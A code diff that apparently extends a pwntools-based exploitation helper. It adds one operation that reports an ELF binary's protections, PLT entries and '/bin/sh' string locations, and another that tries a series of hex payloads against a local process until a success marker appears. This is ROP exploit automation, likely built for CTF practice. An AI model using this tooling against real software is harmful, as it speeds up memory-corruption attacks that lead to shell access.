@@ -97,6 +97,55 @@ def _handle(request: dict) -> dict:
             ]
             gadgets.sort(key=lambda item: item["address"])
             return {"ok": True, "data": {"count": len(gadgets), "gadgets": gadgets[:300]}}
+        if op == "facts":
+            elf = _elf(request["path"])
+            plt = {name: int(address) for name, address in elf.plt.items()}
+            search = request.get("search") or ["/bin/sh"]
+            strings = {}
+            for needle in search:
+                try:
+                    strings[needle] = [int(address) for address in elf.search(
+                        needle.encode() if isinstance(needle, str) else needle)]
+                except Exception:  # noqa: BLE001 - 搜索失败不影响整体
+                    strings[needle] = []
+            return {"ok": True, "data": {
+                "bits": elf.bits, "pie": bool(elf.pie), "canary": bool(elf.canary),
+                "nx": bool(elf.nx), "plt": plt, "strings": strings}}
+        if op == "run_chain":
+            started = time.perf_counter()
+            elf = _elf(request["path"])
+            post = bytes.fromhex(request.get("post", ""))
+            marker = str(request.get("marker") or "")
+            timeout = float(request.get("timeout", 3))
+            attempts = 0
+            for index, payload_hex in enumerate(request["payloads"]):
+                attempts += 1
+                payload = bytes.fromhex(payload_hex)
+                io = None
+                try:
+                    io = process(elf.path)
+                    io.send(payload + b"\n")
+                    if post:
+                        time.sleep(0.05)
+                        io.send(post)
+                    output = io.recvall(timeout=timeout) or b""
+                except Exception:  # noqa: BLE001 - 错误偏移导致崩溃时继续试下一个
+                    output = b""
+                finally:
+                    if io is not None:
+                        try:
+                            io.close()
+                        except Exception:  # noqa: BLE001
+                            pass
+                text = output.decode("utf-8", "replace")
+                if marker and marker in text:
+                    return {"ok": True, "data": {
+                        "solved": True, "index": index, "attempts": attempts,
+                        "output": text[-200:],
+                        "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}}
+            return {"ok": True, "data": {
+                "solved": False, "attempts": attempts,
+                "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}}
         if op == "build":
             elf = _elf(request["path"])
             payload, gadget = _build(elf, int(request["target"]), request["mode"],
